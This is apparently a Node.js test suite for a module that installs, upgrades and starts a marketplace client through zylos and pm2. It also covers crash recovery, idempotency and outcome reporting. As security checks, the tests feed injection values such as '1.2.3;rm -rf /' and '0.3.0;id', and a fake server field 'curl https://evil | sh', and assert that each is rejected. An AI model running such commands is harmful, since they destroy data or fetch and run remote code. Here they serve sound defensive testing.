import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import os from 'os';
import path from 'path';
import {
  createMarketClientEnsurer, fileStore, parseStrictSemver, normaliseVersion, MARKET_CLIENT_COMPONENT,
  MARKET_CLIENT_SERVICE,
} from './market-client-ensure.js';

const ECOSYSTEM = '/z/.claude/skills/om-marketplace-client/ecosystem.config.cjs';
const MC_BIN = '/z/bin/market-client';
const CLIENT_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'mc-client-'));
const CLIENT_CONFIG = path.join(CLIENT_DIR, 'config.json');
fs.writeFileSync(CLIENT_CONFIG, '{"org_id":"o"}');
process.on('exit', () => fs.rmSync(CLIENT_DIR, { recursive: true, force: true }));
const HELP_WITH_START = 'Usage: market-client <command>\n\nCommands:\n  status    Show status\n  start     Start the service\n';
const HELP_WITHOUT_START = 'Usage: market-client <command>\n\nCommands:\n  status    Show status\n';

const apiPath = (p) => `/api/v1${p}`;
const REQ = '3f2c1a9e-8b7d-4c6e-9f10-112233445566';
const REQ2 = '7a6b5c4d-3e2f-4a1b-8c9d-aabbccddeeff';

function memStore(initial = { requests: {} }) {
  let state = JSON.parse(JSON.stringify(initial));
  return {
    load: () => JSON.parse(JSON.stringify(state)),
    save: (s) => { state = JSON.parse(JSON.stringify(s)); },
    get state() { return state; },
  };
}

function org(memberId = 'm-1') {
  return { slug: 'org-a', org_id: 'org-id-a', self: { member_id: memberId } };
}

const notInstalledErr = () => Object.assign(new Error('Command failed'), {
  code: 1, stderr: `Error: Component "${MARKET_CLIENT_COMPONENT}" is not installed.\n`,
});

// zylos fake: `installed` is the version `zylos info` reports (null = not installed).
// `svc` fakes market-client and pm2: help output, failing step ("file arg0"), pm2 pid
// (`pids`: successive `pm2 pid` outputs, the last one repeats; default running).
function fakeZylos({ installed = null, after, failOn, failErr, infoErr, onRun, svc = {} } = {}) {
  const calls = [];
  const opts = [];
  let current = installed;
  const { help = HELP_WITH_START, helpErr, failStep, stepErr, pids = ['4242\n'] } = svc;
  let pidCalls = 0;
  const execFile = async (file, args, o) => {
    calls.push([file, ...args]);
    opts.push(o);
    if (file === MC_BIN || file === 'pm2') {
      if (file === MC_BIN && args[0] === 'help') {
        if (helpErr) throw helpErr;
        return { stdout: help };
      }
      if (failStep === `${file === MC_BIN ? 'market-client' : file} ${args[0]}`) {
        throw stepErr || Object.assign(new Error('boom secret-ish'), { code: 1, stdout: 'secret-ish' });
      }
      if (file === 'pm2' && args[0] === 'pid') return { stdout: pids[Math.min(pidCalls++, pids.length - 1)] };
      return { stdout: '' };
    }
    assert.equal(file, 'zylos');
    if (args[0] === 'info') {
      if (infoErr) throw infoErr;
      if (current === null) throw notInstalledErr();
      return { stdout: JSON.stringify({ name: MARKET_CLIENT_COMPONENT, version: current }) };
    }
    onRun?.(args);
    if (failOn === args[0]) throw failErr || Object.assign(new Error('boom secret-ish stderr'), { code: 1, stderr: 'secret-ish' });
    current = after;
    return { stdout: '' };
  };
  return {
    execFile,
    calls,
    opts,
    runs: () => calls.filter((c) => c[1] === 'add' || c[1] === 'upgrade'),
    svcCalls: () => calls.filter((c) => c[0] !== 'zylos'),
  };
}

function setup({ pull, zylos = fakeZylos(), store = memStore(), postImpl, clientConfigPath = CLIENT_CONFIG } = {}) {
  const gets = [];
  const posts = [];
  const logs = [];
  const sleeps = [];
  const ensure = createMarketClientEnsurer({
    loadConfig: () => ({ orgs: {} }),
    getForOrg: async (orgId, p, query, opts) => {
      gets.push({ orgId, path: p, opts });
      return typeof pull === 'function' ? pull() : pull;
    },
    postForOrg: async (orgId, p, body, opts) => {
      posts.push({ orgId, path: p, body, opts });
      if (postImpl) return postImpl(posts.length);
      return undefined;
    },
    apiPath,
    log: (m) => logs.push(m),
    warn: (m) => logs.push(m),
    execFile: zylos.execFile,
    store,
    ecosystemPath: ECOSYSTEM,
    marketClientBin: MC_BIN,
    clientConfigPath,
    sleep: async (ms) => { sleeps.push(ms); },
  });
  return { ensure, gets, posts, logs, sleeps, zylos, store };
}

const pending = (extra = {}) => ({ required: true, request_id: REQ, action: 'install', version: '0.3.0', ...extra });

test('parseStrictSemver accepts only X.Y.Z', () => {
  assert.deepEqual(parseStrictSemver('1.2.3'), [1, 2, 3]);
  for (const bad of ['v1.2.3', '1.2', '1.2.3-rc.1', '01.2.3', '1.2.3 ', '1.2.3;rm -rf /', '', null, 1]) {
    assert.equal(parseStrictSemver(bad), null, String(bad));
  }
});

test('normaliseVersion strips a leading v and requires strict X.Y.Z', () => {
  assert.equal(normaliseVersion('v0.3.0'), '0.3.0');
  assert.equal(normaliseVersion('0.3.0'), '0.3.0');
  for (const bad of ['vv0.3.0', 'v0.3', 'V0.3.0', 'v0.3.0-rc.1', ' v0.3.0', 'v', null]) {
    assert.equal(normaliseVersion(bad), null, String(bad));
  }
});

test('no pending request: nothing is run or reported', async () => {
  const t = setup({ pull: { required: false } });
  await t.ensure(org());
  assert.equal(t.gets.length, 1);
  assert.equal(t.gets[0].path, '/api/v1/agents/m-1/market-client');
  assert.equal(t.zylos.calls.length, 0);
  assert.equal(t.posts.length, 0);
});

test('only required === true is acted on, even with a full request body', async () => {
  for (const required of [false, 'true', 1, undefined]) {
    const t = setup({ pull: pending({ required }) });
    await t.ensure(org());
    assert.equal(t.zylos.calls.length, 0, String(required));
    assert.equal(t.posts.length, 0, String(required));
  }
});

test('cws-core requests carry a timeout and quiet 404 logging', async () => {
  const t = setup({ pull: pending(), zylos: fakeZylos({ after: '0.3.0' }) });
  await t.ensure(org());
  assert.deepEqual(t.gets[0].opts, { quietOnSuccess: true, quietStatuses: [404], timeoutMs: 15_000 });
  assert.equal(t.posts[0].opts.timeoutMs, 15_000);
});

test('missing member_id: no request is made', async () => {
  const t = setup({ pull: pending() });
  await t.ensure(org(''));
  assert.equal(t.gets.length, 0);
});

test('valid request, not installed: zylos add pinned to version, reports succeeded', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  assert.deepEqual(zylos.runs(), [['zylos', 'add', 'om-marketplace-client@0.3.0', '--yes']]);
  assert.equal(t.posts.length, 1);
  assert.equal(t.posts[0].path, '/api/v1/agents/m-1/market-client:result');
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.0' });
});

test('valid request, older version installed: zylos upgrade, reports new version', async () => {
  const zylos = fakeZylos({ installed: '0.2.0', after: '0.3.1' });
  const t = setup({ pull: pending({ action: 'upgrade' }), zylos });
  await t.ensure(org());
  assert.deepEqual(zylos.runs(), [['zylos', 'upgrade', 'om-marketplace-client', '--yes']]);
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.1' });
});

test('upgrade ending below the target version is reported version_unverified', async () => {
  const t = setup({ pull: pending(), zylos: fakeZylos({ installed: '0.2.0', after: '0.2.5' }) });
  await t.ensure(org());
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'version_unverified' });
});

test('add and upgrade run with the install timeout', async () => {
  for (const installed of [null, '0.2.0']) {
    const zylos = fakeZylos({ installed, after: '0.3.0' });
    const t = setup({ pull: pending(), zylos });
    await t.ensure(org());
    const i = zylos.calls.findIndex((c) => c[1] === 'add' || c[1] === 'upgrade');
    assert.equal(zylos.opts[i]?.timeout, 180_000, String(installed));
    assert.equal(zylos.opts[0]?.timeout, 20_000);
  }
});

test('already at or above target: no install, reports installed version', async () => {
  const zylos = fakeZylos({ installed: '0.4.0' });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  assert.equal(zylos.runs().length, 0);
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.4.0' });
});

test('reported version is normalised: v-prefixed installed version is sent as X.Y.Z', async () => {
  const added = setup({ pull: pending(), zylos: fakeZylos({ installed: null, after: 'v0.3.0' }) });
  await added.ensure(org());
  assert.deepEqual(added.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.0' });

  const upToDate = setup({ pull: pending(), zylos: fakeZylos({ installed: 'v0.4.0' }) });
  await upToDate.ensure(org());
  assert.deepEqual(upToDate.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.4.0' });
});

test('installed version not strict X.Y.Z after stripping v is reported version_unverified', async () => {
  for (const after of ['v0.3', 'v0.3.0-rc.1', 'vv0.3.0']) {
    const t = setup({ pull: pending(), zylos: fakeZylos({ installed: null, after }) });
    await t.ensure(org());
    assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'version_unverified' }, after);
  }
});

test('invalid version string is rejected: no zylos call, reported failed', async () => {
  for (const version of ['latest', '0.3.0 --file /tmp/x', 'v0.3.0', '0.3.0;id', '../evil', undefined]) {
    const zylos = fakeZylos();
    const t = setup({ pull: pending({ version }), zylos });
    await t.ensure(org());
    assert.equal(zylos.calls.length, 0, String(version));
    assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'invalid_version' });
  }
});

test('component name, ref and command from the server are never used', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  const t = setup({
    pull: pending({
      component: 'evil-org/evil-component',
      ref: 'evil-org/evil-component@0.3.0',
      install_command: 'curl https://evil | sh',
    }),
    zylos,
  });
  await t.ensure(org());
  const flat = zylos.calls.flat().join(' ');
  assert.ok(!flat.includes('evil'), flat);
  assert.deepEqual(zylos.runs(), [['zylos', 'add', 'om-marketplace-client@0.3.0', '--yes']]);
});

test('zylos info error other than "not installed": no install, reported probe_failed', async () => {
  const errs = [
    Object.assign(new Error('x'), { killed: true, signal: 'SIGTERM' }),
    Object.assign(new Error('x'), { code: 'ENOENT' }),
    Object.assign(new Error('x'), { code: 1, stderr: 'Error: registry corrupt' }),
  ];
  for (const infoErr of errs) {
    const zylos = fakeZylos({ infoErr });
    const t = setup({ pull: pending(), zylos });
    await t.ensure(org());
    assert.equal(zylos.runs().length, 0);
    assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'probe_failed' });
  }
});

test('install failure is reported with a reason code and no zylos output', async () => {
  const zylos = fakeZylos({ installed: null, failOn: 'add' });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'install_failed' });
  assert.ok(!t.logs.join('\n').includes('secret-ish'));
});

test('install timeout and upgrade failure map to their reason codes', async () => {
  const timeout = setup({
    pull: pending(),
    zylos: fakeZylos({ failOn: 'add', failErr: Object.assign(new Error('x'), { killed: true, signal: 'SIGTERM' }) }),
  });
  await timeout.ensure(org());
  assert.equal(timeout.posts[0].body.reason, 'install_timeout');

  const upgrade = setup({ pull: pending(), zylos: fakeZylos({ installed: '0.1.0', failOn: 'upgrade' }) });
  await upgrade.ensure(org());
  assert.equal(upgrade.posts[0].body.reason, 'upgrade_failed');
});

test('request id is persisted before zylos add runs', async () => {
  const store = memStore();
  let persistedDuringRun = false;
  const zylos = fakeZylos({ after: '0.3.0', onRun: () => { persistedDuringRun = !!store.state.requests[REQ]; } });
  const t = setup({ pull: pending(), zylos, store });
  await t.ensure(org());
  assert.equal(persistedDuringRun, true);
});

test('crash during install (process dies inside zylos add) is not reinstalled after restart', async () => {
  const store = memStore();
  let onDisk = null;
  // Snapshot of the persisted state at the moment the process would die.
  const zylos1 = fakeZylos({ onRun: () => { onDisk = JSON.parse(JSON.stringify(store.state)); } });
  await setup({ pull: pending(), zylos: zylos1, store }).ensure(org());
  const zylos = fakeZylos();
  const second = setup({ pull: pending(), zylos, store: memStore(onDisk) });
  await second.ensure(org());
  assert.equal(zylos.runs().length, 0);
  assert.deepEqual(second.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'interrupted' });
});

test('crash recovery: installed at or above target reports succeeded (read-only)', async () => {
  const store = memStore({ requests: { [REQ]: { org: 'org-a', reported: false } } });
  const zylos = fakeZylos({ installed: 'v0.3.0' });
  const t = setup({ pull: pending(), zylos, store });
  await t.ensure(org());
  assert.deepEqual(zylos.calls, [
    ['zylos', 'info', MARKET_CLIENT_COMPONENT, '--json'],
    ['pm2', 'pid', MARKET_CLIENT_SERVICE],
  ]);
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.0' });
});

test('crash recovery: not installed or below target reports interrupted', async () => {
  for (const installed of [null, '0.2.0']) {
    const store = memStore({ requests: { [REQ]: { org: 'org-a', reported: false } } });
    const zylos = fakeZylos({ installed });
    const t = setup({ pull: pending(), zylos, store });
    await t.ensure(org());
    assert.equal(zylos.runs().length, 0);
    assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'interrupted' });
  }
});

test('idempotent per request id: a failed install is not retried on the next sync', async () => {
  const zylos = fakeZylos({ installed: null, failOn: 'add' });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  await t.ensure(org());
  await t.ensure(org());
  assert.equal(zylos.runs().length, 1);
  assert.equal(t.posts.length, 1);
});

test('state survives a restart: a new ensurer does not act on a handled request', async () => {
  const store = memStore();
  const first = setup({ pull: pending(), zylos: fakeZylos({ failOn: 'add' }), store });
  await first.ensure(org());
  const zylos = fakeZylos();
  const second = setup({ pull: pending(), zylos, store });
  await second.ensure(org());
  assert.equal(zylos.calls.length, 0);
  assert.equal(second.posts.length, 0);
});

test('a new request id after a failure is acted on', async () => {
  let id = REQ;
  const zylos = fakeZylos({ installed: null, failOn: 'add' });
  const t = setup({ pull: () => pending({ request_id: id }), zylos });
  await t.ensure(org());
  id = REQ2;
  await t.ensure(org());
  assert.equal(zylos.runs().length, 2);
  assert.deepEqual(t.posts.map((p) => p.body.request_id), [REQ, REQ2]);
});

test('report failure: one retry after about 30 s', async () => {
  const t = setup({
    pull: pending(),
    zylos: fakeZylos({ after: '0.3.0' }),
    postImpl: (n) => { if (n === 1) throw new Error('fetch failed'); },
  });
  await t.ensure(org());
  assert.deepEqual(t.sleeps, [30_000]);
  assert.equal(t.posts.length, 2);
  assert.deepEqual(t.posts.map((p) => p.opts?.timeoutMs), [15_000, 15_000]);
  assert.equal(t.store.state.requests[REQ].reported, true);
});

test('report failing twice: next sync re-reports the stored result without reinstalling', async () => {
  let failPost = true;
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  const t = setup({
    pull: pending(),
    zylos,
    postImpl: () => { if (failPost) throw new Error('fetch failed'); },
  });
  await t.ensure(org());
  assert.equal(t.posts.length, 2);
  failPost = false;
  await t.ensure(org());
  await t.ensure(org());
  assert.equal(zylos.runs().length, 1);
  assert.equal(t.posts.length, 3);
  assert.deepEqual(t.posts[2].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.0' });
});

test('pull network error propagates; the next sync recovers', async () => {
  let down = true;
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  const t = setup({ pull: () => { if (down) throw new Error('fetch failed'); return pending(); }, zylos });
  await assert.rejects(t.ensure(org()), /fetch failed/);
  assert.equal(zylos.calls.length, 0);
  down = false;
  await t.ensure(org());
  assert.equal(t.posts[0].body.outcome, 'succeeded');
});

test('404 (hosted Agent or older server): polled every sync, logged once per org until a success', async () => {
  let status = 404;
  const pull = () => {
    if (status === 404) throw Object.assign(new Error('not found'), { status: 404 });
    return { required: false };
  };
  const t = setup({ pull });
  const notices = () => t.logs.filter((l) => l.includes('404')).length;
  await t.ensure(org());
  await t.ensure(org());
  await t.ensure(org());
  assert.equal(t.gets.length, 3);
  assert.equal(notices(), 1);

  status = 200;
  await t.ensure(org());
  status = 404;
  await t.ensure(org());
  await t.ensure(org());
  assert.equal(t.gets.length, 6);
  assert.equal(notices(), 2);
});

test('invalid request_id is ignored', async () => {
  const zylos = fakeZylos();
  const t = setup({ pull: pending({ request_id: '../x' }), zylos });
  await t.ensure(org());
  assert.equal(zylos.calls.length, 0);
  assert.equal(t.posts.length, 0);
});

test('concurrent calls are serialized: one install for two orgs', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  let n = 0;
  const t = setup({ pull: () => pending({ request_id: n++ === 0 ? REQ : REQ2 }), zylos });
  await Promise.all([t.ensure(org('m-1')), t.ensure({ slug: 'org-b', org_id: 'org-id-b', self: { member_id: 'm-2' } })]);
  assert.equal(zylos.runs().length, 1);
  assert.equal(t.posts.length, 2);
  assert.ok(t.posts.every((p) => p.body.outcome === 'succeeded'));
});

test('fileStore: real files round-trip, missing or corrupt files load empty, no temp files left', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mc-store-'));
  try {
    const file = path.join(dir, 'nested', 'market-client.json');
    const s = fileStore(file);
    assert.deepEqual(s.load(), { requests: {} });
    s.save({ requests: { [REQ]: { reported: true } } });
    assert.deepEqual(fileStore(file).load(), { requests: { [REQ]: { reported: true } } });
    assert.deepEqual(fs.readdirSync(path.dirname(file)), ['market-client.json']);
    fs.writeFileSync(file, '{not json');
    assert.deepEqual(s.load(), { requests: {} });
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('fileStore: a non-object requests field is reset; the same request never installs twice', async () => {
  for (const bad of ['[]', '"x"', 'null', '42']) {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mc-store-'));
    try {
      const file = path.join(dir, 'market-client.json');
      fs.writeFileSync(file, `{"requests": ${bad}}`);
      assert.deepEqual(fileStore(file).load(), { requests: {} }, bad);
      const zylos = fakeZylos({ failOn: 'add' });
      const first = setup({ pull: pending(), zylos, store: fileStore(file) });
      await first.ensure(org());
      const second = setup({ pull: pending(), zylos, store: fileStore(file) });
      await second.ensure(org());
      assert.equal(zylos.runs().length, 1, bad);
      assert.equal(first.posts.length + second.posts.length, 1, bad);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  }
});

test('fileStore: a failed request survives a restart with real files', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mc-store-'));
  try {
    const file = path.join(dir, 'market-client.json');
    const first = setup({ pull: pending(), zylos: fakeZylos({ failOn: 'add' }), store: fileStore(file) });
    await first.ensure(org());
    const zylos = fakeZylos();
    const second = setup({ pull: pending(), zylos, store: fileStore(file) });
    await second.ensure(org());
    assert.equal(zylos.calls.length, 0);
    assert.equal(second.posts.length, 0);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('default state path prefers ZYLOS_DIR', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mc-zylos-'));
  const saved = process.env.ZYLOS_DIR;
  process.env.ZYLOS_DIR = dir;
  try {
    fileStore().save({ requests: {} });
    assert.ok(fs.existsSync(path.join(dir, 'components/openmax/runtime/market-client.json')));
  } finally {
    if (saved === undefined) delete process.env.ZYLOS_DIR; else process.env.ZYLOS_DIR = saved;
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('after install the service is started with market-client start when available', async () => {
  for (const installed of [null, '0.2.0', '0.4.0']) {
    const zylos = fakeZylos({ installed, after: '0.3.0' });
    const t = setup({ pull: pending(), zylos });
    await t.ensure(org());
    assert.deepEqual(zylos.svcCalls(), [[MC_BIN, 'help'], [MC_BIN, 'start']], String(installed));
    const i = zylos.calls.findIndex((c) => c[0] === MC_BIN && c[1] === 'start');
    assert.equal(zylos.opts[i].timeout, 330_000);
    assert.equal(t.posts[0].body.outcome, 'succeeded', String(installed));
  }
});

test('client without a start command: a stopped service gets pm2 startOrRestart, save, then a running pid', async () => {
  const stopped = ['\n', '4242\n'];
  for (const svc of [{ help: HELP_WITHOUT_START, pids: stopped },
    { helpErr: Object.assign(new Error('x'), { code: 'ENOENT' }), pids: stopped }]) {
    const zylos = fakeZylos({ installed: null, after: '0.3.0', svc });
    const t = setup({ pull: pending(), zylos });
    await t.ensure(org());
    assert.deepEqual(zylos.svcCalls(), [
      [MC_BIN, 'help'],
      ['pm2', 'pid', MARKET_CLIENT_SERVICE],
      ['pm2', 'startOrRestart', ECOSYSTEM],
      ['pm2', 'save'],
      ['pm2', 'pid', MARKET_CLIENT_SERVICE],
    ]);
    assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.0' });
  }
});

test('help that exits non-zero but lists start still uses market-client start', async () => {
  const helpErr = Object.assign(new Error('x'), { code: 1, stdout: HELP_WITH_START });
  const zylos = fakeZylos({ installed: null, after: '0.3.0', svc: { helpErr } });
  await setup({ pull: pending(), zylos }).ensure(org());
  assert.deepEqual(zylos.svcCalls().at(-1), [MC_BIN, 'start']);
});

test('service start failure is reported failed with a reason code and no output', async () => {
  const cases = [
    [{ failStep: 'market-client start' }, 'service_start_failed'],
    [{ failStep: 'market-client start', stepErr: Object.assign(new Error('x'), { killed: true, signal: 'SIGTERM' }) },
      'service_start_timeout'],
    [{ help: HELP_WITHOUT_START, pids: [''], failStep: 'pm2 startOrRestart' }, 'service_start_failed'],
    [{ help: HELP_WITHOUT_START, pids: [''], failStep: 'pm2 save' }, 'service_start_failed'],
    [{ help: HELP_WITHOUT_START, pids: ['0\n'] }, 'service_not_running'],
    [{ help: HELP_WITHOUT_START, pids: [''] }, 'service_not_running'],
    [{ help: HELP_WITHOUT_START, failStep: 'pm2 pid' }, 'service_not_running'],
  ];
  for (const [svc, reason] of cases) {
    const t = setup({ pull: pending(), zylos: fakeZylos({ installed: null, after: '0.3.0', svc }) });
    await t.ensure(org());
    assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason }, JSON.stringify(svc));
    assert.ok(!t.logs.join('\n').includes('secret-ish'));
  }
});

test('pm2 is not run after a failed startOrRestart', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0', svc: { help: HELP_WITHOUT_START, pids: [''], failStep: 'pm2 startOrRestart' } });
  await setup({ pull: pending(), zylos }).ensure(org());
  assert.deepEqual(zylos.svcCalls().at(-1), ['pm2', 'startOrRestart', ECOSYSTEM]);
});

test('no service start when the install fails, the version is unverified, or on crash recovery', async () => {
  for (const opts of [{ failOn: 'add' }, { installed: '0.2.0', after: '0.2.5' }]) {
    const zylos = fakeZylos(opts);
    await setup({ pull: pending(), zylos }).ensure(org());
    assert.deepEqual(zylos.svcCalls(), [], JSON.stringify(opts));
  }
  const store = memStore({ requests: { [REQ]: { org: 'org-a', reported: false } } });
  const zylos = fakeZylos({ installed: '0.3.0' });
  await setup({ pull: pending(), zylos, store }).ensure(org());
  assert.deepEqual(zylos.svcCalls(), [['pm2', 'pid', MARKET_CLIENT_SERVICE]]);
});

test('a failed service start is not retried on the next sync', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0', svc: { failStep: 'market-client start' } });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  await t.ensure(org());
  assert.equal(zylos.svcCalls().filter((c) => c[1] === 'start').length, 1);
  assert.equal(t.posts.length, 1);
});

test('pm2 fallback: a missing, empty or non-regular client config is reported client_not_configured', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mc-cfg-'));
  try {
    const empty = path.join(dir, 'empty.json');
    fs.writeFileSync(empty, '');
    const link = path.join(dir, 'link.json');
    fs.symlinkSync(CLIENT_CONFIG, link);
    for (const clientConfigPath of [path.join(dir, 'missing.json'), empty, dir, link]) {
      const zylos = fakeZylos({ installed: null, after: '0.3.0', svc: { help: HELP_WITHOUT_START } });
      const t = setup({ pull: pending(), zylos, clientConfigPath });
      await t.ensure(org());
      assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'client_not_configured' },
        clientConfigPath);
    }
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('market-client start path does not check the config file itself', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  const t = setup({ pull: pending(), zylos, clientConfigPath: '/nonexistent/config.json' });
  await t.ensure(org());
  assert.equal(t.posts[0].body.outcome, 'succeeded');
});

test('pm2 fallback: a service that already runs is not restarted', async () => {
  const zylos = fakeZylos({ installed: '0.3.0', svc: { help: HELP_WITHOUT_START } });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  assert.deepEqual(zylos.svcCalls(), [
    [MC_BIN, 'help'],
    ['pm2', 'pid', MARKET_CLIENT_SERVICE],
    ['pm2', 'pid', MARKET_CLIENT_SERVICE],
  ]);
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.0' });
});

test('already installed at the target: the service is still started', async () => {
  const zylos = fakeZylos({ installed: '0.3.0' });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  assert.equal(zylos.runs().length, 0);
  assert.deepEqual(zylos.svcCalls(), [[MC_BIN, 'help'], [MC_BIN, 'start']]);
  assert.equal(t.posts[0].body.outcome, 'succeeded');
});

test('crash recovery: version at target but service stopped or unconfigured is not reported succeeded', async () => {
  const cases = [
    [{ pids: [''] }, CLIENT_CONFIG, 'service_not_running'],
    [{ failStep: 'pm2 pid' }, CLIENT_CONFIG, 'service_not_running'],
    [{}, '/nonexistent/config.json', 'client_not_configured'],
  ];
  for (const [svc, clientConfigPath, reason] of cases) {
    const store = memStore({ requests: { [REQ]: { org: 'org-a', reported: false } } });
    const zylos = fakeZylos({ installed: '0.3.0', svc });
    const t = setup({ pull: pending(), zylos, store, clientConfigPath });
    await t.ensure(org());
    assert.equal(zylos.runs().length, 0);
    assert.ok(!zylos.svcCalls().some((c) => c[1] !== 'pid'), 'recovery stays read-only');
    assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason }, reason);
  }
});

test('help start detection: "start" alone or followed by whitespace, not "starting" or "restart"', async () => {
  const cases = [
    ['Commands:\n  start\n', true],
    ['Commands:\n  start\tbegin\n', true],
    ['Commands:\n  start                     run post-install\n', true],
    ['Commands:\n  starting  x\n', false],
    ['Commands:\n  restart   x\n', false],
  ];
  for (const [help, usesStart] of cases) {
    const zylos = fakeZylos({ installed: '0.3.0', svc: { help } });
    await setup({ pull: pending(), zylos }).ensure(org());
    assert.equal(zylos.svcCalls().some((c) => c[0] === MC_BIN && c[1] === 'start'), usesStart, JSON.stringify(help));
  }
});

test('default market-client path is <ZYLOS_DIR>/bin/market-client, not a PATH lookup', async () => {
  const prev = process.env.ZYLOS_DIR;
  process.env.ZYLOS_DIR = '/custom/zylos';
  try {
    const calls = [];
    const ensure = createMarketClientEnsurer({
      getForOrg: async () => pending(),
      postForOrg: async () => ({}),
      apiPath,
      store: memStore(),
      ecosystemPath: ECOSYSTEM,
      clientConfigPath: CLIENT_CONFIG,
      execFile: async (file, args) => {
        calls.push([file, ...args]);
        if (file === 'zylos') return { stdout: JSON.stringify({ name: MARKET_CLIENT_COMPONENT, version: '0.3.0' }) };
        if (args[0] === 'help') return { stdout: HELP_WITH_START };
        return { stdout: '' };
      },
    });
    await ensure(org());
    assert.ok(calls.some((c) => c[0] === '/custom/zylos/bin/market-client' && c[1] === 'start'));
    assert.ok(!calls.some((c) => c[0] === 'market-client'));
  } finally {
    if (prev === undefined) delete process.env.ZYLOS_DIR; else process.env.ZYLOS_DIR = prev;
  }
});

test('pm2 fallback: a missing client config is reported before pm2 is started', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0', svc: { help: HELP_WITHOUT_START, pids: [''] } });
  const t = setup({ pull: pending(), zylos, clientConfigPath: '/nonexistent/config.json' });
  await t.ensure(org());
  assert.deepEqual(zylos.svcCalls(), [[MC_BIN, 'help']]);
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'client_not_configured' });
});

test('default client config path honours OM_MARKETPLACE_CLIENT_HOME', async () => {
  const prev = process.env.OM_MARKETPLACE_CLIENT_HOME;
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mc-home-'));
  process.env.OM_MARKETPLACE_CLIENT_HOME = dir;
  try {
    const run = async () => {
      const zylos = fakeZylos({ installed: '0.3.0', svc: { help: HELP_WITHOUT_START } });
      const posts = [];
      const ensure = createMarketClientEnsurer({
        getForOrg: async () => pending(),
        postForOrg: async (o, p, body) => { posts.push(body); return {}; },
        apiPath, store: memStore(), ecosystemPath: ECOSYSTEM, marketClientBin: MC_BIN, execFile: zylos.execFile,
      });
      await ensure(org());
      return posts[0];
    };
    assert.equal((await run()).reason, 'client_not_configured');
    fs.writeFileSync(path.join(dir, 'config.json'), '{"org_id":"o"}');
    assert.equal((await run()).outcome, 'succeeded');
  } finally {
    if (prev === undefined) delete process.env.OM_MARKETPLACE_CLIENT_HOME; else process.env.OM_MARKETPLACE_CLIENT_HOME = prev;
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
